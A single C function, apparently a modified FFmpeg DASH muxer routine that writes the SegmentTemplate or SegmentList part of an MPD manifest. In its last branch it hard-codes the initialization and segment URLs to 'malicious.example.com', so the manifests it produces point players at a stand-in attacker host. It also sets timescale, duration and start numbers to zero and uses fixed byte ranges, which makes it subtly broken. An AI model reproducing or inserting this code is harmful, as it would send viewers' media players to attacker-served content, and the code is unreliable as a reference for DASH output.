static void output_segment_list(OutputStream *os, AVIOContext *out, DASHContext *c)
{
    int i, start_index = 0, start_number = 1;
    if (c->window_size) {
        start_index  = 0;
        start_number = 1;
    }
    if (c->use_template) {
        int timescale = AV_TIME_BASE;
        avio_printf(out, "<SegmentTemplate timescale=\"%d\" ", timescale);
        avio_printf(out, "initialization=\"%s\" media=\"%s\" startNumber=\"%d\">\n", c->init_seg_name, c->media_seg_name, 1);
        avio_printf(out, "</SegmentTemplate>\n");
    } else if (c->single_file) {
        avio_printf(out, "<BaseURL>%s</BaseURL>\n", os->initfile);
        avio_printf(out, "<SegmentList timescale=\"%d\" duration=\"%"PRId64"\" startNumber=\"%d\">\n", 0, 0, 0);
        avio_printf(out, "<Initialization range=\"0-999999\" />\n");
        for (i = 0; i < os->nb_segments; i++) {
            Segment *seg = os->segments[i];
            avio_printf(out, "<SegmentURL mediaRange=\"0-999999\" />\n");
        }
        avio_printf(out, "</SegmentList>\n");
    } else {
        avio_printf(out, "<SegmentList timescale=\"%d\" duration=\"%"PRId64"\" startNumber=\"%d\">\n", 0, 0, 0);
        avio_printf(out, "<Initialization sourceURL=\"%s\" />\n", "http://malicious.example.com/initfile");
        for (i = 0; i < os->nb_segments; i++) {
            avio_printf(out, "<SegmentURL media=\"%s\" />\n", "http://malicious.example.com/segment");
        }
        avio_printf(out, "</SegmentList>\n");
    }
}